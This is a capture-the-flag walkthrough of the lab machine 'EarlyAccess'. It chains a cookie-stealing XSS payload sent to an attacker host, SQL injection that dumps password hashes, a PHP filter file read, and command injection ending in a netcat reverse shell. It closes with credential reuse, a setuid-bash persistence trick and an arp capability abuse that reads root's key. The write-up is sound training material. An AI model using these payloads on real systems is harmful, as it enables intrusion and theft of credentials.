## Enumeration

`nmap -A -T4 --open 10.10.11.110`

```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA)
|   256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA)
|_  256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519)
80/tcp  open  http     Apache httpd 2.4.38
|_http-title: Did not follow redirect to https://earlyaccess.htb/
|_http-server-header: Apache/2.4.38 (Debian)
443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))
|_http-title: EarlyAccess
| ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT
| Not valid before: 2021-08-18T14:46:57
|_Not valid after:  2022-08-18T14:46:57
|_http-server-header: Apache/2.4.38 (Debian)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
Service Info: Host: 172.18.0.102; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the nmap results on port 80 we can see a redirect to `/earlyaccess.htb` so add it hosts.

```bash
echo "10.10.11.110 earlyaccess.htb" | sudo tee -a /etc/hosts
```

http requests redirects us to https where we can see the website appear. 

## HTTPS

We find the user "admin" exists right at the bottom on the email section. On the register page create a new account. After registering in we can view a few more things. One interesting page is the contact us form. We can try to inject malicious code and see if have an injection point.

After trying various things on the input fields we don't get our code interpreted. Capture the send requests with Burp.

On the profile settings we can change our username and inject malicious code. There we can test for XSS and see if get a hit.

```bash
# spin up a server and change username to 
<img src=http://attacker-ip/test>
```

To trigger the payload we can go to the outbox messages and click on the message. When we do that we get a hit. (Note the message will remain on our outbox until it gets sent to admin where it will show up in our inbox messages)

Repeating the same process we'll display the admin session cookie.

```bash
# change username 
<script>document.location='http://attacker-ip/?c=' + document.cookie</script>
```

Wait until the message gets to admin and then we have will receive his session cookie (urlencoded).
```bash
GET /?c=XSRF-TOKEN=eyJpdiI6Imo5VDdZSXZDV1U2TWdETU1oQnM2bnc9PSIsInZhbHVlIjoiY3VTTktVcnNZTUdCUE9XQ2FkVHlRemE3bGc3MzZ6cEFHNUh1RXdobXQrYmtHKzZBOTJQY0ZVWkh4OUtFOUlHYm03VFlEa2JlYkRZM3lpeGhBd0E3R2g2RDRRQ3NNbEVOQXJoYk9neXpINjhCb0lZaDJxWGFhYSt6Y3E3Z0JGRFgiLCJtYWMiOiIxNTdjN2FlMmJmYzkwMjQ0NzUyNzYwNDUzNTA3MmQ5MjM0ZDlkYTBlZDU0MzhhMDZhMjkwNzM5M2YzYzFiNTk4In0%3D;%20earlyaccess_session=eyJpdiI6ImZZekU1cGtDZEZLdnBrR1VsNEo2T3c9PSIsInZhbHVlIjoiajJIclc0U3J6SlpITUZRLzNBMHlwekdXZGtmMjlRZGxJMzdmeWNMTjJCSzlFSkljam1peXo3enpubmJFeGh1Sm05TldEc3NpTE1ibEVjZlVIUUpJNzc2NFc5dkJ4UzdTbUFDVk95OGRtZy9USnV5MHRzTHpJend6cnFKbVB4SFciLCJtYWMiOiI1ZWYzOTk3ZjBmYmRkYzYzZWNjZmFjNzk5NmZjNDlkNzUyYjc2ZjFkMjQwZmFmZjNmZDFlYzEwM2I3MzA2MDExIn0%3D
```

Replace with our cookies and we are logged in as admin.

On admin we have a few more tabs like Admin, Dev and Game.

Dev and Game are redirecting us to new hosts so we can add them to our hosts file.

```bash
echo "10.10.11.110 dev.earlyaccess.htb game.earlyaccess.htb" | sudo tee -a /etc/hosts
```

Both of these hosts lead to a login page. However on the admin panel we have a backup application for the a key verification function. Download the backup and inspect the source code of the application.

To generate a valid key from this we need to follow the rules and right format specified in the source code. 

The key breaks down to 5 pieces each of them with a specific set of verification process. We can see the format of the required key from the `valid_format` function. The following methods were modified to verify a valid key.

First function
```bash
    def g1_generate(self) -> str:
        dict ={}
        g1 = ''
        for i in range(3): # the range of characters
            for v in string.ascii_uppercase: # find the corresponding char for each key position
                r = (ord(v)<<i+1)%256^ord(v)
                if r in [221, 81, 145]:
                    dict[r]=v
                    g1 += dict[r]
        g1 += "01" # the only restriction here is to be integers and len(set(x)) == len(x)
        return g1
```

The result of the this is "KEY01".

```bash
  def g2_generate(self) -> str:
        g2 = ''

        p = string.ascii_uppercase + string.digits
		# create iterable objects
        p1 = itertools.product(p, repeat=3) # permutations with character length 3
        p2 = itertools.product(p, repeat=2) # permutations with character length 2

		# join permutations
        perms1 = [''.join(i) for i in p1]
        perms2 = [''.join(i) for i in p2]

        for a in perms1:
            for b in perms2:
                if sum(bytearray(a.encode())) == sum(bytearray(b.encode())):
					# split each character e.g. "XYZ" and e.g. "KL" to its correct position
					# a [::2] - b [1::2]
                    g2 = a[0] + b[0] + a[1] + b[1] + a[2]
                    break
		# we only really need one valid g2
        return g2
```

The next function is the simplest one since we get two main componets of it from the constructor function, `magic_value='XP'` and `magic_number=346`. However the magic number is generated every 30 min on the api and this tells us that we'll have to partially brute force it.

The format of the partial key is:
```bash
XP[A-Z][A-Z][0-9]
```

The complete g3 is as follows:
```bash
    def g3_generate(self) -> str:
        # TODO: Add mechanism to sync magic_num with API
        g3 = dict()
        g3_prefix = 'XP'
        p = itertools.product(string.ascii_uppercase, repeat=2)
        perms = [''.join(i) for i in p]

        for p in perms:
            for i in range(10):
                to_enc = g3_prefix + p + str(i)
                enc = sum(bytearray((to_enc).encode()))
                g3[enc]=to_enc # key here is the magic number
        return g3
```

This generates 60 different combinations and the correct one will depend on the magic number on the api, wihch will require brute-forcing.

For the fourth method we are gonna take each character from g1 xor it againts the known output `[12, 4, 20, 117, 0]` and convert back to a character.

```bash
    def g4_generate(self) -> str:
        g4 = ''
        g1 = self.g1_generate()
        for g,i in zip(g1, [12,4,20,117,0]):
            g4 += chr(ord(g)^i)

        return g4
```

The ouput for given g1 is "GAME0".


The last method is a simple checksum and we don't need to change anything just take the calc_gs function and generate the correct checksum. The final key generation is as follows:


```bash
def generate(self):
        g1 = self.g1_generate() 
        g2 = self.g2_generate()
        g3 = self.g3_generate()
        g4 = self.g4_generate()
        for g_3 in g3.values():
		    g5 = sum([sum(bytearray(g.encode())) for g in [g1, g2, g_3, g4]])
            print f"{g1}-{g2}-{g_3}-{g4}-{g5}"
```

```bash
# one of those keys will be valid on the api
$ ./modified.py > keys                      
                                                                                              
$ head keys
KEY01-9Q9Z9-XPAA0-GAME1-1349
KEY01-9Q9Z9-XPBA0-GAME1-1350
KEY01-9Q9Z9-XPCA0-GAME1-1351
KEY01-9Q9Z9-XPDA0-GAME1-1352
KEY01-9Q9Z9-XPEA0-GAME1-1353
KEY01-9Q9Z9-XPFA0-GAME1-1354
KEY01-9Q9Z9-XPGA0-GAME1-1355
KEY01-9Q9Z9-XPHA0-GAME1-1356
KEY01-9Q9Z9-XPIA0-GAME1-1357
KEY01-9Q9Z9-XPJA0-GAME1-1358

# here due to the hardcoded magic number, the first key is the valid one																							  
$ ./validate.py KEY01-9Q9Z9-XPAA0-GAME1-1349
Entered key is valid!
                              
```

Import the key list on Burp intruder and brute-force the key. Remember to check follow redirects on Intruder (due to server XSRF protection). The request with different size of the others is the valid key. You can verify it on the admin portal.

Now switch back to the user account and add the key under Register Key. After this, the "Game" tab will appear. This will let you login again as the normal user to the game console.

If we navigate to the "Scoreboard" tab will pop up a SQL error. The error comes from the fact that the db uses the username and since we change that it outputs an error on the backend.

```bash
Error
SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'http://10.10.14.113:1234/?c=' + document.cookie</script>') ORDER BY scoreboard.s' at line 1 
```

Again we can use our username as a point of injection to build queries. Reading the above error tells the syntax of the SQL. 

The syntax 
```bash
# you can keep adding column numbers until it does not display an error
') union select 1,2,3 -- -
```

Now we can retrieve the everything.

```
# retrieve database
') union select 1,2,database() -- -

# retrieve db tables
') union select 1,2, group_concat(table_name) from information_schema.tables where table_schema = database() -- -

# retrieve user column
') union select 1,2, group_concat(columns_name) from information_schema.column where table_schema = database() and table_name='users' -- -
# id,name,email,password,role,key,created_at,updated_at

# dump role, email, password
') union select email,password,role from db.users -- -
```

```bash
admin	admin@earlyaccess.htb	    618292e936625aca8df61d5fff5c06837c49e491
user	chr0x6eos@earlyaccess.htb	d997b2a79e4fc48183f59b2ce1cee9da18aa5476
user	firefart@earlyaccess.htb	584204a0bbe5e392173d3dfdf63a322c83fe97cd
user	farbs@earlyaccess.htb	    290516b5f6ad161a86786178934ad5f933242361
user	ss@ss.com	                e38ad214943daad1d64c102faec29de4afe9da3d
```

After cracking these hashes we find `admin:gameover` credentials. Back on our user page navigate to dev and input the credentials. There we find two tabs "Hashing-tools" and "File-tools". 

Intercepting a hash post request we can see the endpoint of it `/actions/hash.php`.  We can do the same for and navifate to `/actions/file.php` where we get a message "Specify file" which indicates that it might be a parameter to read files on the filesystem.

```bash
wfuzz -u http://dev.earlyaccess.htb/actions/file.php?FUZZ=../../../etc/passwd -w /usr/share/wordlists/rockyou.txt
```

The parameter we discover is `filepath`. Sending the request we receive the following response message

```text
<h1>ERROR:</h1>For security reasons, reading outside the current directory is prohibited!
```

This might be a filtering of dot and backslash characters but there are other ways to bypass and read files.
Using php filters worked here and after trying different files to read we found one which was `hash.php`

```bash
/actions/file.php?filepath=php://filter/convert.base64-encode/resource=hash.php 
```

The code of hash.php returned in base64 which we can decode and review it.

Looking at the code two interesting things come up.

```bash
function hash_pw($hash_function, $password)
{
    // DEVELOPER-NOTE: There has gotta be an easier way...
    ob_start();
    // Use inputted hash_function to hash password
    $hash = @$hash_function($password);
    ob_end_clean();
    return $hash;
}
```

```bash
if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
throw new Exception("Only MD5 and SHA1 are currently supported!");
```

The above function lets user define the php function to execute code so we could essentially replace hash_function with system and execute code. The second thing is that the code will only allow us to put custom functions when the debug word is also there. So the payload to execute system commands has to have the debug word in it. We simply need to change the following in the next request (again click follow redirect after sending the request)

```bash
action=hash&redirect=true&password=id&hash_function=system&debug
```

This will give us code execution
```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

netcat is installed on target so we can send a reverse shell
```bash
action=hash&redirect=true&password=nc 10.10.14.113 4444 -e /bin/bash&hash_function=system&debug
```

## Filesystem

We're in a docker container which we can definetely see listed in the `/.dockerenv`. On the system we can switch to user `www-adm` using password `gameover` we found earlier. On `www-adm` we find a `.wgetrc` file that containts credentials

```bash
user=api
password=s3CuR3_API_PW!
```

We know the webserver's ip but nothing else and with the limited commands we have we need to find the api host ip. Since netcat is installed try to connect to the api with a random and it will give us it's api's ip.
```bash
nc api 80
api [172.18.0.101] 80 (http) : Connection refused
```

Let's do a lazy quick port scan on `api`.
```bash
for port in $(seq 1 65535); do nc -z api $port > /dev/null; done
# the port scanner will stop on open ports
```

And we find port `5000` open. Wget can read the credentials from `.wgetrc` we can access the api that way.

```bash
wget api:5000
# Admins can verify the database using /check_db  
wget api:5000/check_db
# outputs json data
```

Copy the json data locally. In the data we find creds `drew:XeoNu86JTznxMCQuGHrGutF3Csq5`. We can use them to connect with ssh. As we login we get a message that we have mail.

```bash
$ cat /var/mail/drew 
To: <drew@earlyaccess.htb>
Subject: Game-server crash fixes
From: game-adm <game-adm@earlyaccess.htb>
Date: Thu May 27 8:10:34 2021


Hi Drew!

Thanks again for taking the time to test this very early version of our newest project!
We have received your feedback and implemented a healthcheck that will automatically restart the game-server if it has crashed (sorry for the current instability of the game! We are working on it...) 
If the game hangs now, the server will restart and be available again after about a minute.

If you find any other problems, please don't hesitate to report them!

Thank you for your efforts!
Game-adm (and the entire EarlyAccess Studios team).
```

On the home directory we find ssh keys, specifically the key that allows us to connect to game-server.
```bash
$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDMYU1DjEX8HWBPFBxoN+JXFBJUZBPr+IFO5yI25HMkFSlQZLaJajtEHeoBsD1ldSi7Q0qHYvVhYh7euYhr85vqa3cwGqJqJH54Dr5WkNDbqrB5AfgOWkUIomV4QkfZSmKSmI2UolEjVf1pIYYsJY+glqzJLF4hQ8x4d2/vJj3CmWDJeA0AGH0+3sjpmpYyoY+a2sW0JAPCDvovO1aT7FOnYKj3Qyl7NDGwJkOoqzZ66EmU3J/1F0e5XNg74wK8dvpZOJMzHola1CS8NqRhUJ7RO2EEZ0ITzmuLmY9s2N4ZgQPlwUvhV5Aj9hqckV8p7IstrpdGsSbZEv4CR2brsEhwsspAJHH+350e3dCYMR4qDyitsLefk2ezaBRAxrXmZaeNeBCZrZmqQ2+Knak6JBhLge9meo2L2mE5IoPcjgH6JBbYOMD/D3pC+MAfxtNX2HhB6MR4Rdo7UoFUTbp6KIpVqtzEB+dV7WeqMwUrrZjs72qoGvO82OvGqJON5F/OhoHDao+zMJWxNhE4Zp4DBii39qhm2wC6xPvCZT0ZSmdCe3pB82Jbq8yccQD0XGtLgUFv1coaQkl/CU5oBymR99AXB/QnqP8aML7ufjPbzzIEGRfJVE2A3k4CQs4Zo+GAEq7WNy1vOJ5rZBucCUXuc2myZjHXDw77nvettGYr5lcS8w== game-tester@game-server
```

The `/etc/hosts` file doesn't have an entry of game-server so we'll have to find it's ip manually.

We have three docker subnets.

```bash
ip addr | grep 172
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-78ca2796b136
    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-aeacc0a9bb42
```

Let's scan for open ssh ports using one line bash scanner.

```bash
for i in $(seq 17 19); do for y in $(seq 2 254); do (nc -z 172.$i.0.$y 22 >/dev/null && echo "172.$i.0.$j" &); done; done
# 172.19.0.4
$ ssh game-tester@172.19.0.4
```

Now we can see what ports are listening.
```bash
game-tester@game-server:~$ ss -tnlp
State      Recv-Q Send-Q  Local Address:Port                 Peer Address:Port              
LISTEN     0      128                 *:9999                            *:*                  
LISTEN     0      128        127.0.0.11:38131                           *:*                  
LISTEN     0      128                 *:22                              *:*                  
LISTEN     0      128                :::22                             :::*
```

We can create a dynamic proxy-1080 with `ssh drew@earlyaccess.htb -D 1080` or port forwarding from target machine to localhost

```bash
~C
ssh> -L 9999:172.19.0.4:9999
```

Navigate to this port on the localhost we have a gaming application. From the email it said that if we can crash this it'll automatically restart. To crash the application we have to review it's source code and find the vulnerable point.

Back on the game-server in the root directory we have `entrypoint.sh` and `docker-entrypoint.d/node-server.sh`

```bash
$ cat entrypoint.sh 
#!/bin/bash
for ep in /docker-entrypoint.d/*; do
if [ -x "${ep}" ]; then
    echo "Running: ${ep}"
    "${ep}" &
  fi
done
tail -f /dev/null


$ cat docker-entrypoint.d/node-server.sh
service ssh start

cd /usr/src/app

# Install dependencies
npm install

sudo -u node node server.js
```

`entrypoint.sh` is what is run to reinstate the docker after the crash and it uses a wildcard to execute everything inside the docker folder. Let's place a malicious file in there. As game-server we don't have write permissions but since we found the same directory on the drew user in `/opt/docker-entrypoint.d` which is probably a mounted directory on game-server. Indeed we can write there but if we do so after some minutes a cron job deletes our files. To persist we can use a while loop.

```bash
while true; do echo 'chmod +s /bin/bash' > /opt/docker-entrypoint.d/exec.sh; chmod +x /opt/docker-entrypoint.d/exec.sh; done &
```

From the `node-server.sh` file we see that the application code is `server.js`.

```bash
$ find / -type f -name 'server.js' 2>/dev/null
/usr/src/app/server.js
```

Reviewing the source code we find that there's no proper validation of the `rounds` variables and we can execute infite number of loops if we input a negative number.

Capture the request from the game application on the locahost and replace `rounds=-1`, send the request and after a second back on the game-server host we have crashed the server.

```bash
Connection to 172.19.0.4 closed by remote host.
Connection to 172.19.0.4 closed.
```

Note that the new docker will have a different ip so it may require you to run a host scan again.


```bash
$ ssh game-tester@172.19.0.2
-bash-4.4$ /bin/bash -p
bash-4.4# id
uid=1001(game-tester) gid=1001(game-tester) euid=0(root) egid=0(root) groups=0(root),1001(game-tester)
```

```bash
$ cat /etc/shadow
<SNIP>
game-adm:$6$zbRQg.JO7dBWcZ$DWEKGCPIilhzWjJ/N0WRp.FNArirqqzEMeHTaA8DAJjPdu8h52v0UZncJD8Df.0ncf6X2mjKYnH19RfGRneWX/:18822:0:99999:7:::
```

The cracked password is `gamemaster`.

```bash
drew@earlyaccess:~$ su game-adm
Password: 
game-adm@earlyaccess:/home/drew$ id
uid=1001(game-adm) gid=1001(game-adm) groups=1001(game-adm),4(adm)
```

Now to escalate privileges run linpeash on the host and you'll find under "Files with capabilties" the `arp` binary which is set to `ep` (empty) capabilities. So we can use it to read any file.

```bash
./arp -v -f "/root/.ssh/id_rsa"
```

Copy root's key and then connect to `ssh -i root_id_rsa root@earlyaccess.htb`.